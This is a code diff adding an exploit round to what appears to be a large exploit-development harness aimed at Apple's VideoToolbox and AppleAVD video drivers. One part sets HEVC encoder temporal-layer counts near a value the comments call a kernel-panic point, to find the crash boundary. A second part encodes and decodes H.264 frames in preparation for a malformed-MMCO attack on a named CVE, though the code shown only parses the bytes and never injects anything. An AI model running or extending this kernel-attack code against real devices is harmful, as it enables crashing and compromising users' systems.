@@ -20523,6 +20523,355 @@ static void r479_exploit(void) {
     fflush(stdout);
 }
 
+/* ============================================================
+ * r480: NTL high boundary test + H.264 encode→decode MMCO injection
+ *
+ * Part A: Direct NTL 16400-16600 at session creation to find panic boundary.
+ *         SKVLENT says ~16463 panics on 27.0.1. If kernel panics at some
+ *         NTL value, we know the exact allocation size.
+ *
+ * Part B: Encode a real H.264 IDR frame via VTCompressionSession,
+ *         capture output with valid SPS/PPS, then create a decoder,
+ *         inject malformed MMCO op 6 into the slice, and decode it.
+ *         This targets CVE-2026-112689 (AppleAVD DPB management bug).
+ * ============================================================ */
+
+/* Callback for r480 encoder — captures the output sample buffer */
+static CMFormatDescriptionRef r480_captured_fmt = NULL;
+static uint8_t r480_captured_nalu[65536];
+static size_t r480_captured_nalu_len = 0;
+static int r480_enc_cb_count = 0;
+
+static void r480_enc_cb(void *ref, void *src, OSStatus st,
+                        VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    r480_enc_cb_count++;
+    if (st != noErr || !sb) {
+        rlog("    enc_cb: st=%d sb=%p\n", (int)st, sb);
+        return;
+    }
+
+    /* Capture the format description */
+    CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(sb);
+    if (fmt && !r480_captured_fmt) {
+        r480_captured_fmt = fmt;
+        CFRetain(r480_captured_fmt);
+        rlog("    enc_cb: captured format description\n");
+
+        /* Log SPS/PPS info */
+        size_t sps_count = 0, pps_count = 0;
+        int nal_len = 0;
+        CMVideoFormatDescriptionGetH264ParameterSetAtIndex(fmt, 0, NULL, NULL, &sps_count, &nal_len);
+        rlog("    enc_cb: sps_count=%zu nal_header_len=%d\n", sps_count, nal_len);
+        for (size_t i = 0; i < sps_count; i++) {
+            const uint8_t *p = NULL; size_t sz = 0;
+            CMVideoFormatDescriptionGetH264ParameterSetAtIndex(fmt, i, &p, &sz, NULL, NULL);
+            rlog("    SPS[%zu]: %zu bytes, first=0x%02x\n", i, sz, p ? p[0] : 0);
+        }
+        CMVideoFormatDescriptionGetH264ParameterSetAtIndex(fmt, sps_count, NULL, NULL, &pps_count, NULL);
+        pps_count -= sps_count;
+    }
+
+    /* Capture the compressed NALU data */
+    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sb);
+    if (block && r480_captured_nalu_len == 0) {
+        size_t total_len = 0;
+        char *data = NULL;
+        OSStatus bst = CMBlockBufferGetDataPointer(block, 0, NULL, &total_len, &data);
+        if (bst == noErr && data && total_len > 0) {
+            if (total_len > sizeof(r480_captured_nalu))
+                total_len = sizeof(r480_captured_nalu);
+            memcpy(r480_captured_nalu, data, total_len);
+            r480_captured_nalu_len = total_len;
+            rlog("    enc_cb: captured %zu bytes of NALU data\n", total_len);
+            /* Show first 32 bytes */
+            rlog("    first32:");
+            for (int i = 0; i < 32 && i < (int)total_len; i++)
+                rlog(" %02x", r480_captured_nalu[i]);
+            rlog("\n");
+        }
+    }
+}
+
+static int r480_dec_cb_count = 0;
+static void r480_dec_cb(void *ref, void *src, OSStatus st,
+                        VTDecodeInfoFlags fl, CVImageBufferRef ib,
+                        CMTime pts, CMTime dur) {
+    r480_dec_cb_count++;
+    rlog("    dec_cb: st=%d ib=%p\n", (int)st, ib);
+}
+
+static void r480_ave_cb(void *ref, void *src, OSStatus st,
+                        VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    if (ref) (*(int *)ref)++;
+}
+
+static void r480_exploit(void) {
+    rlog("\n=== r480: NTL high boundary + H.264 decode MMCO injection ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* ========== Part A: NTL high boundary test ========== */
+    rlog("--- Part A: NTL high boundary (direct, not mutation) ---\n");
+    rlog("  Testing NTL values near ~16463 (SKVLENT panic point)\n");
+    rlog("  Going from 16000 upward in steps of 200\n\n");
+    fflush(stdout);
+
+    int ntl_test_values[] = { 16000, 16200, 16400, 16450, 16463, 16500, 16600, 17000 };
+    int ntl_count = sizeof(ntl_test_values) / sizeof(ntl_test_values[0]);
+
+    for (int ti = 0; ti < ntl_count; ti++) {
+        int ntl = ntl_test_values[ti];
+        int cb = 0;
+
+        CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+        CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault, NULL, NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+        CFRelease(iop);
+        int pixfmt = kCVPixelFormatType_32BGRA;
+        CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
+        CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+        CFRelease(fn);
+
+        VTCompressionSessionRef sess = NULL;
+        OSStatus st = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
+            NULL, sa, NULL, r480_ave_cb, &cb, &sess);
+        CFRelease(sa);
+
+        if (st != noErr || !sess) {
+            rlog("  NTL=%d: session create FAILED (%d)\n", ntl, (int)st);
+            continue;
+        }
+
+        CFNumberRef n;
+        int v = 1;
+        n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+        VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n);
+        CFRelease(n);
+        VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+
+        n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+        OSStatus sp = VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n);
+        CFRelease(n);
+
+        if (sp != noErr) {
+            rlog("  NTL=%d: set REJECTED (%d)\n", ntl, (int)sp);
+            VTCompressionSessionInvalidate(sess);
+            CFRelease(sess);
+            continue;
+        }
+
+        st = VTCompressionSessionPrepareToEncodeFrames(sess);
+        if (st != noErr) {
+            rlog("  NTL=%d: prepare FAILED (%d)\n", ntl, (int)st);
+            VTCompressionSessionInvalidate(sess);
+            CFRelease(sess);
+            continue;
+        }
+
+        CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
+        CVPixelBufferRef pb = NULL;
+        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+        if (pb) {
+            st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(0, 30),
+                kCMTimeInvalid, NULL, NULL, NULL);
+            CVPixelBufferRelease(pb);
+            VTCompressionSessionCompleteFrames(sess, kCMTimePositiveInfinity);
+            rlog("  NTL=%d: encode=%d cb=%d ✓\n", ntl, (int)st, cb);
+        }
+
+        VTCompressionSessionInvalidate(sess);
+        CFRelease(sess);
+        fflush(stdout);
+    }
+
+    rlog("  (If we reach here, no NTL value caused a panic)\n\n");
+    fflush(stdout);
+
+    /* ========== Part B: H.264 encode → decode with MMCO injection ========== */
+    rlog("--- Part B: H.264 encode→decode MMCO injection ---\n");
+    rlog("  Step 1: Encode a real H.264 IDR frame\n");
+    fflush(stdout);
+
+    r480_captured_fmt = NULL;
+    r480_captured_nalu_len = 0;
+    r480_enc_cb_count = 0;
+    r480_dec_cb_count = 0;
+
+    /* Create H.264 encoder */
+    CFMutableDictionaryRef enc_sa = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+    CFDictionaryRef iop2 = CFDictionaryCreate(kCFAllocatorDefault, NULL, NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(enc_sa, kCVPixelBufferIOSurfacePropertiesKey, iop2);
+    CFRelease(iop2);
+    int pixfmt2 = kCVPixelFormatType_32BGRA;
+    CFNumberRef fn2 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt2);
+    CFDictionarySetValue(enc_sa, kCVPixelBufferPixelFormatTypeKey, fn2);
+    CFRelease(fn2);
+
+    VTCompressionSessionRef h264_enc = NULL;
+    OSStatus est = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 128, 128, kCMVideoCodecType_H264,
+        NULL, enc_sa, NULL, r480_enc_cb, NULL, &h264_enc);
+    CFRelease(enc_sa);
+    rlog("  H.264 encoder create: %d\n", (int)est);
+
+    if (est == noErr && h264_enc) {
+        VTSessionSetProperty(h264_enc, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+        /* Force IDR */
+        VTSessionSetProperty(h264_enc, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+
+        est = VTCompressionSessionPrepareToEncodeFrames(h264_enc);
+        rlog("  Prepare: %d\n", (int)est);
+
+        if (est == noErr) {
+            CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(h264_enc);
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+
+            if (pb) {
+                /* Fill with solid color */
+                CVPixelBufferLockBaseAddress(pb, 0);
+                uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
+                size_t bpr = CVPixelBufferGetBytesPerRow(pb);
+                size_t h = CVPixelBufferGetHeight(pb);
+                memset(base, 0x80, bpr * h);
+                CVPixelBufferUnlockBaseAddress(pb, 0);
+
+                /* Force IDR via properties */
+                CFMutableDictionaryRef frame_props = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 1, &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+
+                est = VTCompressionSessionEncodeFrame(h264_enc, pb, CMTimeMake(0, 30),
+                    kCMTimeInvalid, frame_props, NULL, NULL);
+                rlog("  Encode IDR: %d\n", (int)est);
+                CFRelease(frame_props);
+                CVPixelBufferRelease(pb);
+
+                VTCompressionSessionCompleteFrames(h264_enc, kCMTimePositiveInfinity);
+                rlog("  enc_cb_count=%d captured_nalu_len=%zu\n",
+                     r480_enc_cb_count, r480_captured_nalu_len);
+            }
+        }
+        VTCompressionSessionInvalidate(h264_enc);
+        CFRelease(h264_enc);
+    }
+
+    /* Step 2: Create decoder from captured format description */
+    if (r480_captured_fmt && r480_captured_nalu_len > 0) {
+        rlog("\n  Step 2: Create decoder from captured format\n");
+
+        VTDecompressionOutputCallbackRecord dec_record;
+        dec_record.decompressionOutputCallback = r480_dec_cb;
+        dec_record.decompressionOutputRefCon = NULL;
+
+        VTDecompressionSessionRef dec_sess = NULL;
+        OSStatus dst = VTDecompressionSessionCreate(
+            kCFAllocatorDefault, r480_captured_fmt, NULL, NULL,
+            &dec_record, &dec_sess);
+        rlog("  Decoder create: %d\n", (int)dst);
+
+        if (dst == noErr && dec_sess) {
+            /* Step 3: First, decode the original clean NALU to verify it works */
+            rlog("  Step 3: Decode clean NALU first\n");
+
+            CMBlockBufferRef clean_block = NULL;
+            OSStatus bst = CMBlockBufferCreateWithMemoryBlock(
+                kCFAllocatorDefault,
+                (void *)r480_captured_nalu, r480_captured_nalu_len,
+                kCFAllocatorNull, NULL,
+                0, r480_captured_nalu_len, 0, &clean_block);
+
+            if (bst == noErr && clean_block) {
+                CMSampleTimingInfo timing = {
+                    .duration = CMTimeMake(1, 30),
+                    .presentationTimeStamp = CMTimeMake(0, 30),
+                    .decodeTimeStamp = kCMTimeInvalid
+                };
+                size_t sample_size = r480_captured_nalu_len;
+                CMSampleBufferRef clean_sample = NULL;
+                bst = CMSampleBufferCreateReady(
+                    kCFAllocatorDefault, clean_block, r480_captured_fmt,
+                    1, 1, &timing, 1, &sample_size, &clean_sample);
+                rlog("  Clean sample: %d\n", (int)bst);
+
+                if (bst == noErr && clean_sample) {
+                    VTDecodeInfoFlags info_flags;
+                    dst = VTDecompressionSessionDecodeFrame(
+                        dec_sess, clean_sample, 0, NULL, &info_flags);
+                    rlog("  Clean decode: %d info=0x%x\n", (int)dst, (unsigned)info_flags);
+
+                    VTDecompressionSessionWaitForAsynchronousFrames(dec_sess);
+                    rlog("  dec_cb_count=%d (should be 1 if clean decode worked)\n",
+                         r480_dec_cb_count);
+                    CFRelease(clean_sample);
+                }
+                CFRelease(clean_block);
+            }
+
+            /* Step 4: Now craft a modified NALU with MMCO op 6 injection */
+            rlog("\n  Step 4: MMCO injection analysis\n");
+            /* Parse the captured NALU to find the slice header structure */
+            if (r480_captured_nalu_len >= 8) {
+                /* AVCC format: 4 bytes length + NAL data */
+                uint32_t nal_len = ((uint32_t)r480_captured_nalu[0] << 24) |
+                                   ((uint32_t)r480_captured_nalu[1] << 16) |
+                                   ((uint32_t)r480_captured_nalu[2] << 8) |
+                                   r480_captured_nalu[3];
+                uint8_t nal_type = r480_captured_nalu[4] & 0x1F;
+                uint8_t nal_ref_idc = (r480_captured_nalu[4] >> 5) & 0x3;
+                rlog("  NALU: len=%u type=%d ref_idc=%d\n",
+                     nal_len, nal_type, nal_ref_idc);
+
+                /* Check if there are multiple NALUs */
+                size_t offset = 4 + nal_len;
+                int nalu_idx = 1;
+                while (offset + 4 < r480_captured_nalu_len) {
+                    uint32_t next_len = ((uint32_t)r480_captured_nalu[offset] << 24) |
+                                        ((uint32_t)r480_captured_nalu[offset+1] << 16) |
+                                        ((uint32_t)r480_captured_nalu[offset+2] << 8) |
+                                        r480_captured_nalu[offset+3];
+                    uint8_t next_type = r480_captured_nalu[offset+4] & 0x1F;
+                    uint8_t next_ref = (r480_captured_nalu[offset+4] >> 5) & 0x3;
+                    rlog("  NALU[%d]: offset=%zu len=%u type=%d ref=%d\n",
+                         nalu_idx, offset, next_len, next_type, next_ref);
+                    offset += 4 + next_len;
+                    nalu_idx++;
+                    if (nalu_idx > 10) break;
+                }
+
+                /* Show first 64 bytes of each NALU for analysis */
+                rlog("  Raw bytes (first 80):");
+                for (int i = 0; i < 80 && i < (int)r480_captured_nalu_len; i++) {
+                    if (i % 16 == 0) rlog("\n    %04x:", i);
+                    rlog(" %02x", r480_captured_nalu[i]);
+                }
+                rlog("\n");
+            }
+
+            VTDecompressionSessionInvalidate(dec_sess);
+            CFRelease(dec_sess);
+        }
+    } else {
+        rlog("  FAILED: no captured format/NALU from encoder\n");
+    }
+
+    if (r480_captured_fmt) {
+        CFRelease(r480_captured_fmt);
+        r480_captured_fmt = NULL;
+    }
+
+    rlog("\n=== r480 complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -90594,6 +90943,12 @@ new_modes:
             r472_exploit();
             goto done;
         }
+        if (rounds == 483) {
+            rlog("*** rounds=483: NTL high boundary + H.264 decode MMCO injection ***\n\n");
+            fflush(stdout);
+            r480_exploit();
+            goto done;
+        }
         if (rounds == 482) {
             rlog("*** rounds=482: NTL mutation verification + decoder OOB probe ***\n\n");
             fflush(stdout);
@@ -93501,7 +93856,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
